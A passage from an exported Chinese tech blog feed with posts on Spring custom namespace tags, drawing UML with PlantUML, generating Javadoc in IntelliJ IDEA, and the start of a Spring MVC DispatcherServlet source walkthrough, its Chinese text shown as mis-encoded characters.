<h3 id="BeanDefinitionDecorator"><a href="#BeanDefinitionDecorator" class="headerlink" title="BeanDefinitionDecorator"></a>BeanDefinitionDecorator</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JCacheInitializingBeanDefinitionDecorator</span> <span class="keyword">implements</span> <span class="title">BeanDefinitionDecorator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] EMPTY_STRING_ARRAY = <span class="keyword">new</span> String[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> BeanDefinitionHolder <span class="title">decorate</span><span class="params">(Node source, BeanDefinitionHolder holder,</span></span></span><br><span class="line"><span class="function"><span class="params">            ParserContext ctx)</span> </span>&#123;</span><br><span class="line">        String initializerBeanName = registerJCacheInitializer(source, ctx);</span><br><span class="line">        createDependencyOnJCacheInitializer(holder, initializerBeanName);</span><br><span class="line">        <span class="keyword">return</span> holder;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">createDependencyOnJCacheInitializer</span><span class="params">(BeanDefinitionHolder holder,</span></span></span><br><span class="line"><span class="function"><span class="params">            String initializerBeanName)</span> </span>&#123;</span><br><span class="line">        AbstractBeanDefinition definition = ((AbstractBeanDefinition) holder.getBeanDefinition());</span><br><span class="line">        String[] dependsOn = definition.getDependsOn();</span><br><span class="line">        <span class="keyword">if</span> (dependsOn == <span class="keyword">null</span>) &#123;</span><br><span class="line">            dependsOn = <span class="keyword">new</span> String[]&#123;initializerBeanName&#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            List dependencies = <span class="keyword">new</span> ArrayList(Arrays.asList(dependsOn));</span><br><span class="line">            dependencies.add(initializerBeanName);</span><br><span class="line">            dependsOn = (String[]) dependencies.toArray(EMPTY_STRING_ARRAY);</span><br><span class="line">        &#125;</span><br><span class="line">        definition.setDependsOn(dependsOn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">registerJCacheInitializer</span><span class="params">(Node source, ParserContext ctx)</span> </span>&#123;</span><br><span class="line">        String cacheName = ((Attr) source).getValue();</span><br><span class="line">        String beanName = cacheName + <span class="string">"-initializer"</span>;</span><br><span class="line">        <span class="keyword">if</span> (!ctx.getRegistry().containsBeanDefinition(beanName)) &#123;</span><br><span class="line">            BeanDefinitionBuilder initializer = BeanDefinitionBuilder.rootBeanDefinition(JCacheInitializer<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            initializer.addConstructorArg(cacheName);</span><br><span class="line">            ctx.getRegistry().registerBeanDefinition(beanName, initializer.getBeanDefinition());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> beanName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="META-INF"><a href="#META-INF" class="headerlink" title="META-INF"></a>META-INF</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># in 'META-INF/spring.handlers'</span><br><span class="line">http\://www.foo.com/schema/jcache=com.foo.JCacheNamespaceHandler</span><br><span class="line"># in 'META-INF/spring.schemas'</span><br><span class="line">http\://www.foo.com/schema/jcache/jcache.xsd=com/foo/jcache.xsd</span><br></pre></td></tr></table></figure>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><a href="http://docs.spring.io/spring/docs/current/spring-framework-reference/htmlsingle/" rel="external nofollow noopener noreferrer" target="_blank">spring-framework-reference</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> è‡ªå®šä¹‰æ ‡ç­¾ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[plantumlâ€”â€”ç”¨ç¼–ç çš„æ–¹å¼ç”»UML]]></title>
      <url>http://qsli.github.io/2016/10/16/plantuml/</url>
      <content type="html"><![CDATA[<h2 id="æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="æ˜¯ä»€ä¹ˆï¼Ÿ"></a>æ˜¯ä»€ä¹ˆï¼Ÿ</h2><blockquote>
<p>PlantUML is a component that allows to quickly write :</p>
</blockquote>
<blockquote>
<ul>
<li>Sequence diagram,</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>Usecase diagram,</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>Class diagram,</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>Activity diagram, (here is the new syntax),</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>Component diagram,</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>State diagram,</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>Deployment diagram,</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>Object diagram.</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>wireframe graphical interface</li>
</ul>
</blockquote>
<blockquote>
<p>Diagrams are defined using a simple and intuitive  language. ( see PlantUML Language Reference Guide).</p>
</blockquote>
<h2 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&#123;% plantuml %&#125;</span><br><span class="line">skinparam backgroundColor #EEEBDC</span><br><span class="line">skinparam handwritten true</span><br><span class="line"></span><br><span class="line">skinparam sequence &#123;</span><br><span class="line">	ArrowColor DeepSkyBlue</span><br><span class="line">	ActorBorderColor DeepSkyBlue</span><br><span class="line">	LifeLineBorderColor blue</span><br><span class="line">	LifeLineBackgroundColor #A9DCDF</span><br><span class="line"></span><br><span class="line">	ParticipantBorderColor DeepSkyBlue</span><br><span class="line">	ParticipantBackgroundColor DodgerBlue</span><br><span class="line">	ParticipantFontName Impact</span><br><span class="line">	ParticipantFontSize 17</span><br><span class="line">	ParticipantFontColor #A9DCDF</span><br><span class="line"></span><br><span class="line">	ActorBackgroundColor aqua</span><br><span class="line">	ActorFontColor DeepSkyBlue</span><br><span class="line">	ActorFontSize 17</span><br><span class="line">	ActorFontName Aapex</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">actor User</span><br><span class="line">participant &quot;First Class&quot; as A</span><br><span class="line">participant &quot;Second Class&quot; as B</span><br><span class="line">participant &quot;Last Class&quot; as C</span><br><span class="line"></span><br><span class="line">User -&gt; A: DoWork</span><br><span class="line">activate A</span><br><span class="line"></span><br><span class="line">A -&gt; B: Create Request</span><br><span class="line">activate B</span><br><span class="line"></span><br><span class="line">B -&gt; C: DoWork</span><br><span class="line">activate C</span><br><span class="line">C --&gt; B: WorkDone</span><br><span class="line">destroy C</span><br><span class="line"></span><br><span class="line">B --&gt; A: Request Created</span><br><span class="line">deactivate B</span><br><span class="line"></span><br><span class="line">A --&gt; User: Done</span><br><span class="line">deactivate A</span><br><span class="line"></span><br><span class="line">&#123;% endplantuml %&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸Šè¿°ä»£ç çš„æ•ˆæœå¦‚ä¸‹ï¼š</p>
<img src="http://www.plantuml.com/plantuml/svg/TP8zJyCm48Rdtg-mojo12T41oNPQ2Qb2Y0enN-EZM6djzEnG2kA_4wSL-OBrdlShLY0KrfN8k1SRp8ij-yePxNUUnTLYiL2PXbRnXiuSsSP8JaIk23eiqA4YbvFuWebaziTpI4PKhekJsjNgYSoZP-NP4Fz1L_QLLjPHLx3fa-52UPlfR0amUKIEDhSbklXlVbSp2CgysHAFP4lluWFkITplIypZYAtj9udhcz5zkExytODEF5HuGQrd_5ozdjzBiqfYIH_m3O3fB9u3CPJj4Z5TMWvHw1s6C1KOXEpZDUNUcGvNVRx2dbi3f0enknDoNZ_PY-SYLTjtZFKO09cGcWlDb2vFwOy8iPKe09KaUkpMeCNix4uWyux0r6RsfzIh6bYtNZ8l5QRMTDDb8qiZKqCJqTdt0m00">
<h2 id="å¹³å°"><a href="#å¹³å°" class="headerlink" title="å¹³å°"></a>å¹³å°</h2><p>å¯ä»¥åœ¨chromeappä¸­æ‰¾åˆ°ï¼š <a href="https://chrome.google.com/webstore/detail/uml-diagram-editor/hoepdgfgogmeofkgkpapbdpdjkplcode?utm_source=chrome-ntp-icon" rel="external nofollow noopener noreferrer" target="_blank">é“¾æ¥</a>, å¼€ç®±å³ç”¨</p>
<p>å¦å¯ä»¥å’Œideaå’Œeclipseã€atomç­‰ç¼–è¾‘å™¨é›†æˆï¼Œhexoä¸­ä¹Ÿæœ‰ç›¸åº”çš„æ’ä»¶ï¼Œå…·ä½“å¯çœ‹ä¸‹é¢çš„æ•™ç¨‹</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="http://skyao.github.io/2014/12/05/plantuml-installation/index.html" rel="external nofollow noopener noreferrer" target="_blank">(è®°å½•)plantumlå®‰è£…é…ç½®</a></p>
</li>
<li><p><a href="http://keyun.ml/2016/07/25/2016-07-25-hexo-uml.html" rel="external nofollow noopener noreferrer" target="_blank">Hexoåšå®¢ä¸­çš„ç»˜å›¾</a></p>
</li>
<li><p><a href="http://plantuml.com/" rel="external nofollow noopener noreferrer" target="_blank">å®˜ç½‘</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> hexo </category>
            
        </categories>
        
        
        <tags>
            
            <tag> uml </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[åœ¨Intellij Ideaä¸­ç”ŸæˆJavadoc]]></title>
      <url>http://qsli.github.io/2016/10/05/javadoc/</url>
      <content type="html"><![CDATA[<p><code>Tools | Generate JavaDoc</code>, å†™ä¸Šè¾“å‡ºè·¯å¾„å³å¯ã€‚</p>
<h2 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><ol>
<li><p>locale</p>
<p>ç®€ä½“ä¸­æ–‡å†™<code>zh_CN</code></p>
</li>
<li><p>ç¼–ç </p>
<p>åœ¨<code>Other Commandline arguments</code>ä¸­æŒ‡å®š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-encoding UTF-8 -charset UTF-8</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ol>
<li><p><a href="http://www.cnblogs.com/cyberniuniu/p/5021910.html" rel="external nofollow noopener noreferrer" target="_blank">åœ¨ IntelliJ IDEA ä¸­ä¸ºè‡ªå·±è®¾è®¡çš„ç±»åº“ç”Ÿæˆ JavaDoc</a></p>
</li>
<li><p><a href="https://www.jetbrains.com/help/idea/2016.2/generate-javadoc-dialog.html" rel="external nofollow noopener noreferrer" target="_blank">Generate JavaDoc Dialog</a></p>
</li>
<li><p><a href="https://www.jetbrains.com/help/idea/2016.2/generating-javadoc-reference-for-a-project.html" rel="external nofollow noopener noreferrer" target="_blank">Generating JavaDoc Reference for a Project</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> idea </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Javadoc </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Spring Mvcæºç å‰–æ(ä¸€)]]></title>
      <url>http://qsli.github.io/2016/10/02/spring-mvc/</url>
      <content type="html"><![CDATA[<h2 id="æ¶æ„"><a href="#æ¶æ„" class="headerlink" title="æ¶æ„"></a>æ¶æ„</h2><img src="/2016/10/02/spring-mvc/arch.jpg">
<p>SpringMVCçš„æ ¸å¿ƒæ˜¯ <code>DispatcherServlet</code></p>
<h2 id="æœ¬è´¨"><a href="#æœ¬è´¨" class="headerlink" title="æœ¬è´¨"></a>æœ¬è´¨</h2><p>æˆ‘ä»¬é€šè¿‡åœ¨<code>web.xml</code>ä¸­é…ç½®å¦‚ä¸‹çš„è¯­å¥ï¼Œå¼•å…¥SpringMVC</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>mvc-dispatcher<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:/spring/mvc/mvc-dispatcher-servlet.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¸Šè¿°ä»£ç æ®µæŒ‡å®šäº†servletçš„classæ˜¯springçš„<code>DispatcherServlet</code>ï¼Œåˆå§‹åŒ–é…ç½®æ–‡ä»¶æ˜¯<code>mvc-dispatcher-servlet.xml</code>,ä»¥åŠservletçš„åŠ è½½é¡ºåºã€‚</p>
<p>æ—¢ç„¶<code>DispatcherServlet</code>ä¹Ÿæ˜¯ä¸€ä¸ª<code>Servlet</code>ï¼Œé‚£ä»–è‚¯å®šä¹Ÿéµä»servletçš„è§„èŒƒã€‚<br>æˆ‘ä»¬çŸ¥é“Servletå®šä¹‰äº†å¦‚ä¸‹çš„æ¥å£ï¼š<br><img src="/2016/10/02/spring-mvc/servlet-interface.jpg"></p>
<p>å…¶ä¸­æ¯”è¾ƒé‡è¦çš„æ˜¯<code>init</code>å’Œ<code>service</code>æ¥å£<br><code>init</code>æ–¹æ³•åœ¨servletçš„ä¸€ç”Ÿä¸­åªåˆå§‹åŒ–ä¸€æ¬¡ï¼Œ<code>service</code>æ¥å£æ˜¯Servletå¯¹å¤–æä¾›æœåŠ¡çš„æ¥å£<br>Servletçš„ç”Ÿå‘½å‘¨æœŸå¦‚ä¸‹:<br><img src="/2016/10/02/spring-mvc/Servlet_LifeCycle.jpg"></p>
<p>æˆ‘ä»¬æ¥çœ‹ä¸‹<code>DispatcherServlet</code>çš„ç»§æ‰¿ç»“æ„ï¼š</p>
<img src="/2016/10/02/spring-mvc/hierachy.jpg">
<h3 id="initæ–¹æ³•"><a href="#initæ–¹æ³•" class="headerlink" title="initæ–¹æ³•"></a>initæ–¹æ³•</h3><p>ç›´æ¥å»çœ‹<code>DispatcherServlet</code>çš„æºç æ˜¯æ²¡æœ‰å‘ç°<code>init</code>æ–¹æ³•çš„ï¼Œ å®ƒçš„<code>init</code>æ–¹æ³•ç»§æ‰¿è‡ª<code>HttpServletBean</code>ï¼Œæºç å¦‚ä¸‹ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Map config parameters onto bean properties of this servlet, and</span></span><br><span class="line"><span class="comment"> * invoke subclass initialization.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ServletException if bean properties are invalid (or required</span></span><br><span class="line"><span class="comment"> * properties are missing), or if subclass initialization fails.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">		logger.debug(<span class="string">"Initializing servlet '"</span> + getServletName() + <span class="string">"'"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Set bean properties from init parameters.</span></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		PropertyValues pvs = <span class="keyword">new</span> ServletConfigPropertyValues(getServletConfig(), <span class="keyword">this</span>.requiredProperties);</span><br><span class="line">		BeanWrapper bw = PropertyAccessorFactory.forBeanPropertyAccess(<span class="keyword">this</span>);</span><br><span class="line">		ResourceLoader resourceLoader = <span class="keyword">new</span> ServletContextResourceLoader(getServletContext());</span><br><span class="line">		bw.registerCustomEditor(Resource<span class="class">.<span class="keyword">class</span>, <span class="title">new</span> <span class="title">ResourceEditor</span>(<span class="title">resourceLoader</span>, <span class="title">getEnvironment</span>()))</span>;</span><br><span class="line">		initBeanWrapper(bw);</span><br><span class="line">		bw.setPropertyValues(pvs, <span class="keyword">true</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span> (BeansException ex) &#123;</span><br><span class="line">		logger.error(<span class="string">"Failed to set bean properties on servlet '"</span> + getServletName() + <span class="string">"'"</span>, ex);</span><br><span class="line">		<span class="keyword">throw</span> ex;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Let subclasses do whatever initialization they like.</span></span><br><span class="line">	initServletBean();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">		logger.debug(<span class="string">"Servlet '"</span> + getServletName() + <span class="string">"' configured successfully"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œä¸»è¦å®Œæˆäº†beanå±æ€§çš„é…ç½®ï¼Œå¹¶ä¸”ç»™å­ç±»ç•™ä¸‹äº†ç›¸åº”çš„hook</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Let subclasses do whatever initialization they like.</span></span><br><span class="line">initServletBean();</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªæ–¹æ³•åœ¨FrameworkServletä¸­æœ‰å…·ä½“çš„å®ç°ï¼Œç°åœ¨çœ‹ä¸‹FrameworkServletä¸­çš„å®ç°ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Overridden method of &#123;<span class="doctag">@link</span> HttpServletBean&#125;, invoked after any bean properties</span></span><br><span class="line"><span class="comment">	 * have been set. Creates this servlet's WebApplicationContext.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">initServletBean</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">		getServletContext().log(<span class="string">"Initializing Spring FrameworkServlet '"</span> + getServletName() + <span class="string">"'"</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.logger.isInfoEnabled()) &#123;</span><br><span class="line">			<span class="keyword">this</span>.logger.info(<span class="string">"FrameworkServlet '"</span> + getServletName() + <span class="string">"': initialization started"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">long</span> startTime = System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">this</span>.webApplicationContext = initWebApplicationContext();</span><br><span class="line">			initFrameworkServlet();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (ServletException ex) &#123;</span><br><span class="line">			<span class="keyword">this</span>.logger.error(<span class="string">"Context initialization failed"</span>, ex);</span><br><span class="line">			<span class="keyword">throw</span> ex;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (RuntimeException ex) &#123;</span><br><span class="line">			<span class="keyword">this</span>.logger.error(<span class="string">"Context initialization failed"</span>, ex);</span><br><span class="line">			<span class="keyword">throw</span> ex;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.logger.isInfoEnabled()) &#123;</span><br><span class="line">			<span class="keyword">long</span> elapsedTime = System.currentTimeMillis() - startTime;</span><br><span class="line">			<span class="keyword">this</span>.logger.info(<span class="string">"FrameworkServlet '"</span> + getServletName() + <span class="string">"': initialization completed in "</span> +</span><br><span class="line">					elapsedTime + <span class="string">" ms"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p><code>webApplicationContext</code>åœ¨æ­¤è¿›è¡Œåˆå§‹åŒ–ï¼Œå¹¶ä¸”ç»™å­ç±»ç•™ä¸‹äº†ä¸€ä¸ªhook<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.webApplicationContext = initWebApplicationContext();</span><br><span class="line">initFrameworkServlet();</span><br></pre></td></tr></table></figure></p>
<p><code>initFrameworkServlet</code>åœ¨æœ¬ç±»ä¸­å¹¶æ²¡æœ‰å®ç°ï¼Œç”¨äºå­ç±»æ§åˆ¶</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* This method will be invoked after any bean properties have been set and</span></span><br><span class="line"><span class="comment">* the WebApplicationContext has been loaded. The default implementation is empty;</span></span><br><span class="line"><span class="comment">* subclasses may override this method to perform any initialization they require.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@throws</span> ServletException in case of an initialization exception</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initFrameworkServlet</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨initWebApplicationContextæ–¹æ³•ä¸­ï¼Œæœ‰ä¸€ä¸ªç©ºå®ç°çš„æ–¹æ³•onRefresh()<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Template method which can be overridden to add servlet-specific refresh work.</span></span><br><span class="line"><span class="comment">* Called after successful context refresh.</span></span><br><span class="line"><span class="comment">* &lt;p&gt;This implementation is empty.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> context the current WebApplicationContext</span></span><br><span class="line"><span class="comment">* <span class="doctag">@see</span> #refresh()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onRefresh</span><span class="params">(ApplicationContext context)</span> </span>&#123;</span><br><span class="line"><span class="comment">// For subclasses: do nothing by default.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>è¿™ä¸ªæ–¹æ³•ä¹Ÿæ˜¯é’©å­æ–¹æ³•ï¼ŒDispatcherServletæ­£æ˜¯å®ç°äº†è¿™ä¸ªæ–¹æ³•ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	* This implementation calls &#123;<span class="doctag">@link</span> #initStrategies&#125;.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onRefresh</span><span class="params">(ApplicationContext context)</span> </span>&#123;</span><br><span class="line">		initStrategies(context);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">		 * Initialize the strategy objects that this servlet uses.</span></span><br><span class="line"><span class="comment">		 * &lt;p&gt;May be overridden in subclasses in order to initialize further strategy objects.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initStrategies</span><span class="params">(ApplicationContext context)</span> </span>&#123;</span><br><span class="line">			initMultipartResolver(context);</span><br><span class="line">			initLocaleResolver(context);</span><br><span class="line">			initThemeResolver(context);</span><br><span class="line">			initHandlerMappings(context);</span><br><span class="line">			initHandlerAdapters(context);</span><br><span class="line">			initHandlerExceptionResolvers(context);</span><br><span class="line">			